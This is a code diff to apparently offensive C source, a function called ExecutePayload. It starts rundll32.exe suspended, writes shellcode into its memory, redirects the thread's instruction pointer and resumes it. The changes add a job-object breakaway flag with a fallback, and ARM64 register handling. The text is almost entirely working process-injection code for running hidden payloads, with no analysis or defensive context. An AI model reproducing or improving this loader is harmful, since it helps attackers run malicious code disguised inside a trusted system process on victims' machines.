@@ -112,7 +112,14 @@ void ExecutePayload(void) {
 
 	if (Synchronize()) {
 		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
-		if (CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
+		DWORD result = CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS|CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi);
+		
+		// If we fail, try again without the CREATE_BREAKAWAY_FROM_JOB flag in the event that we are in a job but we can't break away from it.
+		if (result == FALSE){
+			result = CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi);
+		}
+
+		if (result) {
 			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 			GetThreadContext(pi.hThread, &ctx);
 
@@ -120,7 +127,10 @@ void ExecutePayload(void) {
 
 			WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
 
-	#ifdef _WIN64
+	// _WIN64 is also defined on ARM64, so check that before Rip.
+	#if defined(_M_ARM64) || defined(__aarch64__)
+			ctx.Pc = (DWORD64)ep;
+	#elif defined(_WIN64)
 			ctx.Rip = (DWORD64)ep;
 	#else
 			ctx.Eip = (DWORD)ep;
